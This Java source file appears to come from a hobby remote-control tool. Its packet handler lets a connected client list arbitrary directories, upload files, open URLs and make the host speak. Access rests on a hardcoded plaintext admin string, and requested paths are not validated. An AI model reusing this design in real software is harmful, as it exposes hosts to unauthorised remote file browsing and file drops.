package NetworkUtils;

import NetworkUtils.Packets.*;
import Other.Util;

import java.awt.*;
import java.io.File;
import java.net.URI;
import java.util.Arrays;

public class PacketHandler {
    private SocketConnection connection;

    public PacketHandler(SocketConnection connection) {
        this.connection = connection;
    }

    public void onHandshake(HandshakePacket packet) {
    }

    public void onAdminID(AdminIDPacket packet) {
        String adminID = packet.getAdminID().trim();

        if (isValidAdmin(adminID)) {
            System.out.println("Admin client connected!");
            connection.sendPacket(new PrintPacket("Admin verified!"));
        } else {
            System.out.println("Invalid Admin ID: " + adminID);
            connection.sendPacket(new PrintPacket("Invalid Admin ID: " + adminID));
            connection.close();
        }
    }

    private boolean isValidAdmin(String adminID) {
        return adminID.equals("Winston smells");
    }

    public void onPrint(PrintPacket packet) {
        System.out.println("[Message] : " + packet.getMessage());
    }

    public void onSpeak(SpeakPacket packet) {
        Util.speak(packet.getMessage());
    }

    public void onUploadStart(FileUploadStartPacket packet) {
        // Register the file upload task
        connection.registerFileID(packet);
    }

    public void onWebsite(WebsitePacket packet) {
        System.out.println("Received website packet!");
        try {
            String s = packet.getUrl();
            if (!s.startsWith("http")) s = "https://" + s;
            Desktop.getDesktop().browse(new URI(s));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onViewDirectory(ViewDirectoryPacket packet) {
        String path = packet.getPath();
        File dir = new File(path);

        if (dir.exists() && dir.isDirectory()) {
            String[] files = dir.list();
            // Send directory contents back to the client
            String directoryContents = files != null ? Arrays.toString(files) : "No files found";
            connection.sendPacket(new PrintPacket("Directory contents: " + directoryContents));
        } else {
            connection.sendPacket(new PrintPacket("Invalid directory: " + path));
        }
    }

    public void onChangeDirectory(ChangeDirectoryPacket packet) {
        String newPath = packet.getPath();
        File newDir = new File(newPath);

        if (newDir.exists() && newDir.isDirectory()) {
            // Update server's current directory state
            connection.sendPacket(new PrintPacket("Changed to directory: " + newPath));
        } else {
            connection.sendPacket(new PrintPacket("Invalid directory: " + newPath));
        }
    }

    public void onUploadRequest(UploadRequestPacket packet) {
        String fileName = packet.getFileName();
        int fileSize = packet.getFileSize();
        System.out.println("Ready to upload file: " + fileName + " (" + fileSize + " bytes)");
        connection.sendPacket(new PrintPacket("Ready to upload file: " + fileName));
    }

    public void onFileChunk(FileChunkPacket packet) {
        int operationId = packet.getOperationId();

        // Add the received chunk to the corresponding file upload
        byte[] data = packet.getData();
        long offset = packet.getOffset();

        // Add chunk to the file in the active uploads map
        connection.addToFileID(operationId, data);
        System.out.println("Received chunk at offset: " + offset + " for operation ID: " + operationId);
    }

    // File upload/download is complete
    public void onFileComplete(FileCompletePacket packet) {
        int operationId = packet.getOperationId();
        connection.finishFileID(operationId);

        // Can remove the operation from activeUploads in case finishFileID doesn't
        System.out.println("File operation " + operationId + " completed and removed from active uploads.");
    }
}
